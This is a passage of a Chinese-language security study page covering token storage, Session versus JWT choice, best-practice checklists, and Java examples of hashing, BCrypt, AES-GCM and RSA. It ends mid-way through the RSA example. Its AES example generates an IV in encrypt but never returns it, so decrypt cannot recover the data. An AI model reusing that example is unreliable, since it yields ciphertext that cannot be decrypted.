</span><span id="__span-115-17"><a id="__codelineno-115-17" name="__codelineno-115-17" href="#__codelineno-115-17"></a>
</span><span id="__span-115-18"><a id="__codelineno-115-18" name="__codelineno-115-18" href="#__codelineno-115-18"></a>4. 内存变量
</span><span id="__span-115-19"><a id="__codelineno-115-19" name="__codelineno-115-19" href="#__codelineno-115-19"></a>   - 优点：安全性最高
</span><span id="__span-115-20"><a id="__codelineno-115-20" name="__codelineno-115-20" href="#__codelineno-115-20"></a>   - 缺点：刷新页面丢失
</span><span id="__span-115-21"><a id="__codelineno-115-21" name="__codelineno-115-21" href="#__codelineno-115-21"></a>   - 结论：适合SPA + 自动刷新机制
</span><span id="__span-115-22"><a id="__codelineno-115-22" name="__codelineno-115-22" href="#__codelineno-115-22"></a>
</span><span id="__span-115-23"><a id="__codelineno-115-23" name="__codelineno-115-23" href="#__codelineno-115-23"></a>推荐方案：
</span><span id="__span-115-24"><a id="__codelineno-115-24" name="__codelineno-115-24" href="#__codelineno-115-24"></a>Web应用：
</span><span id="__span-115-25"><a id="__codelineno-115-25" name="__codelineno-115-25" href="#__codelineno-115-25"></a>- Access Token：内存 + 自动刷新
</span><span id="__span-115-26"><a id="__codelineno-115-26" name="__codelineno-115-26" href="#__codelineno-115-26"></a>- Refresh Token：HttpOnly Cookie
</span><span id="__span-115-27"><a id="__codelineno-115-27" name="__codelineno-115-27" href="#__codelineno-115-27"></a>
</span><span id="__span-115-28"><a id="__codelineno-115-28" name="__codelineno-115-28" href="#__codelineno-115-28"></a>移动应用：
</span><span id="__span-115-29"><a id="__codelineno-115-29" name="__codelineno-115-29" href="#__codelineno-115-29"></a>- Access Token：内存
</span><span id="__span-115-30"><a id="__codelineno-115-30" name="__codelineno-115-30" href="#__codelineno-115-30"></a>- Refresh Token：加密存储（Keychain/EncryptedSharedPreferences）
</span><span id="__span-115-31"><a id="__codelineno-115-31" name="__codelineno-115-31" href="#__codelineno-115-31"></a>
</span><span id="__span-115-32"><a id="__codelineno-115-32" name="__codelineno-115-32" href="#__codelineno-115-32"></a>安全配置：
</span><span id="__span-115-33"><a id="__codelineno-115-33" name="__codelineno-115-33" href="#__codelineno-115-33"></a>Set-Cookie: access_token=xxx; 
</span><span id="__span-115-34"><a id="__codelineno-115-34" name="__codelineno-115-34" href="#__codelineno-115-34"></a>  HttpOnly;         // 防XSS
</span><span id="__span-115-35"><a id="__codelineno-115-35" name="__codelineno-115-35" href="#__codelineno-115-35"></a>  Secure;           // 仅HTTPS
</span><span id="__span-115-36"><a id="__codelineno-115-36" name="__codelineno-115-36" href="#__codelineno-115-36"></a>  SameSite=Strict;  // 防CSRF
</span><span id="__span-115-37"><a id="__codelineno-115-37" name="__codelineno-115-37" href="#__codelineno-115-37"></a>  Path=/;
</span><span id="__span-115-38"><a id="__codelineno-115-38" name="__codelineno-115-38" href="#__codelineno-115-38"></a>  Max-Age=900
</span><span id="__span-115-39"><a id="__codelineno-115-39" name="__codelineno-115-39" href="#__codelineno-115-39"></a>
</span><span id="__span-115-40"><a id="__codelineno-115-40" name="__codelineno-115-40" href="#__codelineno-115-40"></a>面试加分项：
</span><span id="__span-115-41"><a id="__codelineno-115-41" name="__codelineno-115-41" href="#__codelineno-115-41"></a>- 对比不同存储方式的安全性
</span><span id="__span-115-42"><a id="__codelineno-115-42" name="__codelineno-115-42" href="#__codelineno-115-42"></a>- 说明CSRF防护措施
</span><span id="__span-115-43"><a id="__codelineno-115-43" name="__codelineno-115-43" href="#__codelineno-115-43"></a>- 提到移动端的特殊处理
</span></code></pre></div></p>
<hr />
<h2 id="总结">总结<a class="headerlink" href="#总结" title="链接到此标题">&para;</a></h2>
<h3 id="session-vs-jwt-选择决策树">Session vs JWT 选择决策树<a class="headerlink" href="#session-vs-jwt-选择决策树" title="链接到此标题">&para;</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>开始
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a>  │
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#__codelineno-116-3"></a>  ├─ 是微服务架构？
</span><span id="__span-116-4"><a id="__codelineno-116-4" name="__codelineno-116-4" href="#__codelineno-116-4"></a>  │   ├─ 是 → 使用JWT
</span><span id="__span-116-5"><a id="__codelineno-116-5" name="__codelineno-116-5" href="#__codelineno-116-5"></a>  │   └─ 否 → 继续
</span><span id="__span-116-6"><a id="__codelineno-116-6" name="__codelineno-116-6" href="#__codelineno-116-6"></a>  │
</span><span id="__span-116-7"><a id="__codelineno-116-7" name="__codelineno-116-7" href="#__codelineno-116-7"></a>  ├─ 是否需要跨域？
</span><span id="__span-116-8"><a id="__codelineno-116-8" name="__codelineno-116-8" href="#__codelineno-116-8"></a>  │   ├─ 是 → 使用JWT
</span><span id="__span-116-9"><a id="__codelineno-116-9" name="__codelineno-116-9" href="#__codelineno-116-9"></a>  │   └─ 否 → 继续
</span><span id="__span-116-10"><a id="__codelineno-116-10" name="__codelineno-116-10" href="#__codelineno-116-10"></a>  │
</span><span id="__span-116-11"><a id="__codelineno-116-11" name="__codelineno-116-11" href="#__codelineno-116-11"></a>  ├─ 是否是移动端API？
</span><span id="__span-116-12"><a id="__codelineno-116-12" name="__codelineno-116-12" href="#__codelineno-116-12"></a>  │   ├─ 是 → 使用JWT
</span><span id="__span-116-13"><a id="__codelineno-116-13" name="__codelineno-116-13" href="#__codelineno-116-13"></a>  │   └─ 否 → 继续
</span><span id="__span-116-14"><a id="__codelineno-116-14" name="__codelineno-116-14" href="#__codelineno-116-14"></a>  │
</span><span id="__span-116-15"><a id="__codelineno-116-15" name="__codelineno-116-15" href="#__codelineno-116-15"></a>  ├─ 是否需要频繁撤销会话？
</span><span id="__span-116-16"><a id="__codelineno-116-16" name="__codelineno-116-16" href="#__codelineno-116-16"></a>  │   ├─ 是 → 使用Session
</span><span id="__span-116-17"><a id="__codelineno-116-17" name="__codelineno-116-17" href="#__codelineno-116-17"></a>  │   └─ 否 → 使用JWT
</span><span id="__span-116-18"><a id="__codelineno-116-18" name="__codelineno-116-18" href="#__codelineno-116-18"></a>  │
</span><span id="__span-116-19"><a id="__codelineno-116-19" name="__codelineno-116-19" href="#__codelineno-116-19"></a>  └─ 单体应用 → 使用Session
</span></code></pre></div>
<h3 id="最佳实践清单">最佳实践清单<a class="headerlink" href="#最佳实践清单" title="链接到此标题">&para;</a></h3>
<p><strong>Session最佳实践：</strong>
- ✅ 登录后重新生成SessionID
- ✅ 设置HttpOnly、Secure、SameSite
- ✅ 分布式系统使用Redis存储
- ✅ 实施超时策略（固定+滑动）
- ✅ 限制并发会话数</p>
<p><strong>JWT最佳实践：</strong>
- ✅ 使用强签名算法（HS256/RS256）
- ✅ 设置合理的过期时间（15分钟）
- ✅ 实施Refresh Token机制
- ✅ Token存储在HttpOnly Cookie或内存
- ✅ 不在Payload中存放敏感信息
- ✅ 验证所有标准Claims（exp, iss, aud）
- ✅ 防止算法混淆攻击</p>
<p><strong>通用安全实践：</strong>
- ✅ 全站HTTPS
- ✅ 实施CSRF防护
- ✅ 防止XSS攻击（输入验证、输出编码）
- ✅ 日志记录和监控
- ✅ 定期安全审计</p>
<hr />
<h2 id="密码学基础">密码学基础<a class="headerlink" href="#密码学基础" title="链接到此标题">&para;</a></h2>
<h3 id="哈希hash">哈希（Hash）<a class="headerlink" href="#哈希hash" title="链接到此标题">&para;</a></h3>
<p>**定义：**单向函数，将任意长度数据转换为固定长度的摘要，不可逆。</p>
<p><strong>特性：</strong>
- <strong>确定性</strong>：相同输入产生相同输出
- <strong>不可逆</strong>：无法从哈希值推导原始数据
- <strong>雪崩效应</strong>：输入微小变化导致输出巨大变化
- <strong>抗碰撞</strong>：难以找到两个不同输入产生相同哈希值</p>
<p><strong>常用算法：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="c1">// MD5（已不安全，不推荐）</span>
</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a><span class="n">String</span><span class="w"> </span><span class="n">md5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DigestUtils</span><span class="p">.</span><span class="na">md5Hex</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">);</span>
</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a>
</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#__codelineno-117-4"></a><span class="c1">// SHA-256（安全，但不适合密码存储）</span>
</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#__codelineno-117-5"></a><span class="n">String</span><span class="w"> </span><span class="n">sha256</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DigestUtils</span><span class="p">.</span><span class="na">sha256Hex</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">);</span>
</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6" href="#__codelineno-117-6"></a>
</span><span id="__span-117-7"><a id="__codelineno-117-7" name="__codelineno-117-7" href="#__codelineno-117-7"></a><span class="c1">// BCrypt（推荐用于密码存储，自带盐值和成本因子）</span>
</span><span id="__span-117-8"><a id="__codelineno-117-8" name="__codelineno-117-8" href="#__codelineno-117-8"></a><span class="n">String</span><span class="w"> </span><span class="n">bcrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">hashpw</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">gensalt</span><span class="p">(</span><span class="mi">12</span><span class="p">));</span>
</span><span id="__span-117-9"><a id="__codelineno-117-9" name="__codelineno-117-9" href="#__codelineno-117-9"></a>
</span><span id="__span-117-10"><a id="__codelineno-117-10" name="__codelineno-117-10" href="#__codelineno-117-10"></a><span class="c1">// Argon2（最新推荐，2015年密码哈希大赛冠军）</span>
</span><span id="__span-117-11"><a id="__codelineno-117-11" name="__codelineno-117-11" href="#__codelineno-117-11"></a><span class="n">Argon2</span><span class="w"> </span><span class="n">argon2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Argon2Factory</span><span class="p">.</span><span class="na">create</span><span class="p">();</span>
</span><span id="__span-117-12"><a id="__codelineno-117-12" name="__codelineno-117-12" href="#__codelineno-117-12"></a><span class="n">String</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argon2</span><span class="p">.</span><span class="na">hash</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">65536</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;password&quot;</span><span class="p">);</span>
</span></code></pre></div></p>
<p><strong>密码存储最佳实践：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PasswordService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a><span class="cm">     * 密码加密存储</span>
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a><span class="cm">     * 使用BCrypt，自动添加盐值</span>
</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#__codelineno-118-6"></a><span class="cm">     */</span>
</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7" href="#__codelineno-118-7"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodePassword</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">plainPassword</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8" href="#__codelineno-118-8"></a><span class="w">        </span><span class="c1">// cost factor = 12, 2^12 = 4096 轮</span>
</span><span id="__span-118-9"><a id="__codelineno-118-9" name="__codelineno-118-9" href="#__codelineno-118-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">hashpw</span><span class="p">(</span><span class="n">plainPassword</span><span class="p">,</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">gensalt</span><span class="p">(</span><span class="mi">12</span><span class="p">));</span>
</span><span id="__span-118-10"><a id="__codelineno-118-10" name="__codelineno-118-10" href="#__codelineno-118-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-118-11"><a id="__codelineno-118-11" name="__codelineno-118-11" href="#__codelineno-118-11"></a>
</span><span id="__span-118-12"><a id="__codelineno-118-12" name="__codelineno-118-12" href="#__codelineno-118-12"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-118-13"><a id="__codelineno-118-13" name="__codelineno-118-13" href="#__codelineno-118-13"></a><span class="cm">     * 密码验证</span>
</span><span id="__span-118-14"><a id="__codelineno-118-14" name="__codelineno-118-14" href="#__codelineno-118-14"></a><span class="cm">     */</span>
</span><span id="__span-118-15"><a id="__codelineno-118-15" name="__codelineno-118-15" href="#__codelineno-118-15"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verifyPassword</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">plainPassword</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">hashedPassword</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-16"><a id="__codelineno-118-16" name="__codelineno-118-16" href="#__codelineno-118-16"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">checkpw</span><span class="p">(</span><span class="n">plainPassword</span><span class="p">,</span><span class="w"> </span><span class="n">hashedPassword</span><span class="p">);</span>
</span><span id="__span-118-17"><a id="__codelineno-118-17" name="__codelineno-118-17" href="#__codelineno-118-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-118-18"><a id="__codelineno-118-18" name="__codelineno-118-18" href="#__codelineno-118-18"></a><span class="p">}</span>
</span><span id="__span-118-19"><a id="__codelineno-118-19" name="__codelineno-118-19" href="#__codelineno-118-19"></a>
</span><span id="__span-118-20"><a id="__codelineno-118-20" name="__codelineno-118-20" href="#__codelineno-118-20"></a><span class="c1">// 数据库存储示例</span>
</span><span id="__span-118-21"><a id="__codelineno-118-21" name="__codelineno-118-21" href="#__codelineno-118-21"></a><span class="c1">// 原始密码: &quot;myPassword123&quot;</span>
</span><span id="__span-118-22"><a id="__codelineno-118-22" name="__codelineno-118-22" href="#__codelineno-118-22"></a><span class="c1">// 存储值: &quot;$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW&quot;</span>
</span><span id="__span-118-23"><a id="__codelineno-118-23" name="__codelineno-118-23" href="#__codelineno-118-23"></a><span class="c1">//         ^^^ ^^  ^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
</span><span id="__span-118-24"><a id="__codelineno-118-24" name="__codelineno-118-24" href="#__codelineno-118-24"></a><span class="c1">//         |   |   |                        |</span>
</span><span id="__span-118-25"><a id="__codelineno-118-25" name="__codelineno-118-25" href="#__codelineno-118-25"></a><span class="c1">//         |   |   |                        +-- 哈希值(31字符)</span>
</span><span id="__span-118-26"><a id="__codelineno-118-26" name="__codelineno-118-26" href="#__codelineno-118-26"></a><span class="c1">//         |   |   +-- 盐值(22字符)</span>
</span><span id="__span-118-27"><a id="__codelineno-118-27" name="__codelineno-118-27" href="#__codelineno-118-27"></a><span class="c1">//         |   +-- cost factor</span>
</span><span id="__span-118-28"><a id="__codelineno-118-28" name="__codelineno-118-28" href="#__codelineno-118-28"></a><span class="c1">//         +-- 算法标识(2a = BCrypt)</span>
</span></code></pre></div></p>
<h3 id="加密encryption">加密（Encryption）<a class="headerlink" href="#加密encryption" title="链接到此标题">&para;</a></h3>
<p>**定义：**双向转换，可以解密还原原始数据。</p>
<h4 id="对称加密">对称加密<a class="headerlink" href="#对称加密" title="链接到此标题">&para;</a></h4>
<p>**特点：**加密和解密使用相同密钥。</p>
<p><strong>常用算法：</strong>
- <strong>AES</strong>（Advanced Encryption Standard）：最常用，安全性高
- <strong>DES</strong>（已淘汰）、<strong>3DES</strong>（逐步淘汰）</p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a><span class="cm">/**</span>
</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a><span class="cm"> * AES加密示例</span>
</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a><span class="cm"> */</span>
</span><span id="__span-119-4"><a id="__codelineno-119-4" name="__codelineno-119-4" href="#__codelineno-119-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AESEncryption</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-119-5"><a id="__codelineno-119-5" name="__codelineno-119-5" href="#__codelineno-119-5"></a>
</span><span id="__span-119-6"><a id="__codelineno-119-6" name="__codelineno-119-6" href="#__codelineno-119-6"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">ALGORITHM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;AES/GCM/NoPadding&quot;</span><span class="p">;</span>
</span><span id="__span-119-7"><a id="__codelineno-119-7" name="__codelineno-119-7" href="#__codelineno-119-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">KEY_SIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="c1">// 256位密钥</span>
</span><span id="__span-119-8"><a id="__codelineno-119-8" name="__codelineno-119-8" href="#__codelineno-119-8"></a>
</span><span id="__span-119-9"><a id="__codelineno-119-9" name="__codelineno-119-9" href="#__codelineno-119-9"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-119-10"><a id="__codelineno-119-10" name="__codelineno-119-10" href="#__codelineno-119-10"></a><span class="cm">     * 加密数据</span>
</span><span id="__span-119-11"><a id="__codelineno-119-11" name="__codelineno-119-11" href="#__codelineno-119-11"></a><span class="cm">     */</span>
</span><span id="__span-119-12"><a id="__codelineno-119-12" name="__codelineno-119-12" href="#__codelineno-119-12"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">plaintext</span><span class="p">,</span><span class="w"> </span><span class="n">SecretKey</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-119-13"><a id="__codelineno-119-13" name="__codelineno-119-13" href="#__codelineno-119-13"></a><span class="w">        </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">ALGORITHM</span><span class="p">);</span>
</span><span id="__span-119-14"><a id="__codelineno-119-14" name="__codelineno-119-14" href="#__codelineno-119-14"></a><span class="w">        </span><span class="n">GCMParameterSpec</span><span class="w"> </span><span class="n">parameterSpec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">GCMParameterSpec</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span><span class="w"> </span><span class="n">generateIV</span><span class="p">());</span>
</span><span id="__span-119-15"><a id="__codelineno-119-15" name="__codelineno-119-15" href="#__codelineno-119-15"></a><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">Cipher</span><span class="p">.</span><span class="na">ENCRYPT_MODE</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">parameterSpec</span><span class="p">);</span>
</span><span id="__span-119-16"><a id="__codelineno-119-16" name="__codelineno-119-16" href="#__codelineno-119-16"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">plaintext</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span>
</span><span id="__span-119-17"><a id="__codelineno-119-17" name="__codelineno-119-17" href="#__codelineno-119-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-119-18"><a id="__codelineno-119-18" name="__codelineno-119-18" href="#__codelineno-119-18"></a>
</span><span id="__span-119-19"><a id="__codelineno-119-19" name="__codelineno-119-19" href="#__codelineno-119-19"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-119-20"><a id="__codelineno-119-20" name="__codelineno-119-20" href="#__codelineno-119-20"></a><span class="cm">     * 解密数据</span>
</span><span id="__span-119-21"><a id="__codelineno-119-21" name="__codelineno-119-21" href="#__codelineno-119-21"></a><span class="cm">     */</span>
</span><span id="__span-119-22"><a id="__codelineno-119-22" name="__codelineno-119-22" href="#__codelineno-119-22"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">decrypt</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="n">SecretKey</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">iv</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-119-23"><a id="__codelineno-119-23" name="__codelineno-119-23" href="#__codelineno-119-23"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-119-24"><a id="__codelineno-119-24" name="__codelineno-119-24" href="#__codelineno-119-24"></a><span class="w">        </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">ALGORITHM</span><span class="p">);</span>
</span><span id="__span-119-25"><a id="__codelineno-119-25" name="__codelineno-119-25" href="#__codelineno-119-25"></a><span class="w">        </span><span class="n">GCMParameterSpec</span><span class="w"> </span><span class="n">parameterSpec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">GCMParameterSpec</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span><span class="w"> </span><span class="n">iv</span><span class="p">);</span>
</span><span id="__span-119-26"><a id="__codelineno-119-26" name="__codelineno-119-26" href="#__codelineno-119-26"></a><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">Cipher</span><span class="p">.</span><span class="na">DECRYPT_MODE</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">parameterSpec</span><span class="p">);</span>
</span><span id="__span-119-27"><a id="__codelineno-119-27" name="__codelineno-119-27" href="#__codelineno-119-27"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">plaintext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">);</span>
</span><span id="__span-119-28"><a id="__codelineno-119-28" name="__codelineno-119-28" href="#__codelineno-119-28"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
</span><span id="__span-119-29"><a id="__codelineno-119-29" name="__codelineno-119-29" href="#__codelineno-119-29"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-119-30"><a id="__codelineno-119-30" name="__codelineno-119-30" href="#__codelineno-119-30"></a>
</span><span id="__span-119-31"><a id="__codelineno-119-31" name="__codelineno-119-31" href="#__codelineno-119-31"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-119-32"><a id="__codelineno-119-32" name="__codelineno-119-32" href="#__codelineno-119-32"></a><span class="cm">     * 生成随机IV（初始化向量）</span>
</span><span id="__span-119-33"><a id="__codelineno-119-33" name="__codelineno-119-33" href="#__codelineno-119-33"></a><span class="cm">     */</span>
</span><span id="__span-119-34"><a id="__codelineno-119-34" name="__codelineno-119-34" href="#__codelineno-119-34"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">generateIV</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-119-35"><a id="__codelineno-119-35" name="__codelineno-119-35" href="#__codelineno-119-35"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="mi">12</span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="c1">// GCM模式推荐12字节</span>
</span><span id="__span-119-36"><a id="__codelineno-119-36" name="__codelineno-119-36" href="#__codelineno-119-36"></a><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">SecureRandom</span><span class="p">().</span><span class="na">nextBytes</span><span class="p">(</span><span class="n">iv</span><span class="p">);</span>
</span><span id="__span-119-37"><a id="__codelineno-119-37" name="__codelineno-119-37" href="#__codelineno-119-37"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iv</span><span class="p">;</span>
</span><span id="__span-119-38"><a id="__codelineno-119-38" name="__codelineno-119-38" href="#__codelineno-119-38"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-119-39"><a id="__codelineno-119-39" name="__codelineno-119-39" href="#__codelineno-119-39"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>应用场景：</strong>
- 数据库敏感字段加密（身份证、银行卡号）
- 配置文件加密
- 传输层加密（TLS/SSL）</p>
<h4 id="非对称加密">非对称加密<a class="headerlink" href="#非对称加密" title="链接到此标题">&para;</a></h4>
<p>**特点：**使用公钥加密，私钥解密（或反之）。</p>
<p><strong>常用算法：</strong>
- <strong>RSA</strong>：最常用，适合加密和签名
- <strong>ECC</strong>（椭圆曲线）：更短的密钥长度，相同安全性</p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a><span class="cm">/**</span>
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a><span class="cm"> * RSA加密示例</span>
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a><span class="cm"> */</span>
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RSAEncryption</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a>
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#__codelineno-120-6"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7" href="#__codelineno-120-7"></a><span class="cm">     * 生成密钥对</span>
</span><span id="__span-120-8"><a id="__codelineno-120-8" name="__codelineno-120-8" href="#__codelineno-120-8"></a><span class="cm">     */</span>
</span><span id="__span-120-9"><a id="__codelineno-120-9" name="__codelineno-120-9" href="#__codelineno-120-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">KeyPair</span><span class="w"> </span><span class="nf">generateKeyPair</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
